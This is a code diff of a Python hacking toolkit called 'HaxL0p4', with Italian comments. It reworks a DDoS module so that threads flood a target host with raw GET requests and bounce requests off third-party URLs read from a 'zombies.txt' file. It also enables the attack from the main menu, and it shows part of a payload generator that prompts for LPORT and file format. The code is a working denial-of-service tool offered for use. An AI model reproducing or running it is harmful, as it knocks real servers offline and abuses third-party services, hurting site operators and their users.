@@ -124,10 +124,10 @@ def animazione_lettere(testo, ms):
 
 
 
-
 def HaxL0p4_Ddos():
     os.system("clear && figlet HaxL0p4-DDos")
     animazione_lettere(f"{Fore.RED}\n [😼] HaxL0p4-DDos by L0PA on Github{Style.RESET_ALL}\n", 0.03)
+
     def user_agent():
         global uagent
         uagent=[]
@@ -140,23 +140,17 @@ def HaxL0p4_Ddos():
         uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
         return(uagent)
 
+    def my_bots_from_file(filename):
+        with open(filename, 'r') as file:
+            bots = [line.strip() for line in file.readlines()]
+        return bots
+
     def my_bots():
         global bots
-        bots=[]
-        bots.append("http://validator.w3.org/check?uri=")
-        bots.append("http://www.facebook.com/sharer/sharer.php?u=")
-        return(bots)
+        bots = my_bots_from_file('zombies.txt')
+        return bots
 
-    def bot_hammering(url):
-        try:
-            while True:
-                req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-                print("\033[94mbot is hammering...\033[0m")
-                time.sleep(.1)
-        except:
-            time.sleep(.1)
-
-    def down_it(item):
+    def down_it():
         try:
             while True:
                 packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
@@ -173,17 +167,14 @@ def HaxL0p4_Ddos():
             print("\033[91m no connection! server maybe down\033[0m")
             time.sleep(.1)
 
-    def dos():
-        while True:
-            item = q.get()
-            down_it(item)
-            q.task_done()
-
-    def dos2():
-        while True:
-            item=w.get()
-            bot_hammering(random.choice(bots)+"http://"+host)
-            w.task_done()
+    def bot_hammering():
+        try:
+            while True:
+                req = urllib.request.urlopen(urllib.request.Request(random.choice(my_bots())+"http://"+host,headers={'User-Agent': random.choice(uagent)}))
+                print("\033[94m HaxL0p4 is attacking...\033[0m")
+                time.sleep(.1)
+        except:
+            time.sleep(.1)
 
     # Aggiunta della funzione per richiedere l'input dall'utente
     def get_user_input():
@@ -224,10 +215,10 @@ def HaxL0p4_Ddos():
 
     # Creazione e avvio dei thread
     for i in range(int(thr)):
-        t = threading.Thread(target=dos)
+        t = threading.Thread(target=down_it)
         t.daemon = True
         t.start()
-        t2 = threading.Thread(target=dos2)
+        t2 = threading.Thread(target=bot_hammering)
         t2.daemon = True
         t2.start()
 
@@ -243,6 +234,7 @@ def HaxL0p4_Ddos():
 
     q.join()
     w.join()
+
 
 
 
@@ -333,7 +325,7 @@ def setPayload():
                 LPORT = int(input(f" LPORT {Fore.CYAN}>{Style.RESET_ALL} "))
                 break
             except ValueError:
-                print(f"\n {Fore.RED} [!]Formato non valido. Inserisci un numero intero.\n{Style.RESET_ALL}")
+                print(f"\n {Fore.RED} [!] Formato non valido. Inserisci un numero intero.\n{Style.RESET_ALL}")
 
         FORMAT = input(f"\n FORMAT (ES: exe): {Fore.CYAN}>{Style.RESET_ALL} ")
         NAME = input(f" \n NAME {Fore.CYAN}>{Style.RESET_ALL} ")
@@ -577,13 +569,6 @@ def network():
 
 
 
-
-
-
-
-
-
-
 def vuln_scan():
     os.system("clear && figlet Hax-Scan")
     print(vuln_scan_options)
@@ -705,8 +690,6 @@ def menu():
                 vuln_scan()
             elif s == "4":
                 while True:
-                    #animazione_lettere(prossimamente, 0.03)
-                    #return menu()
                     HaxL0p4_Ddos()
             elif s == "5":
                 ipGeolocation()
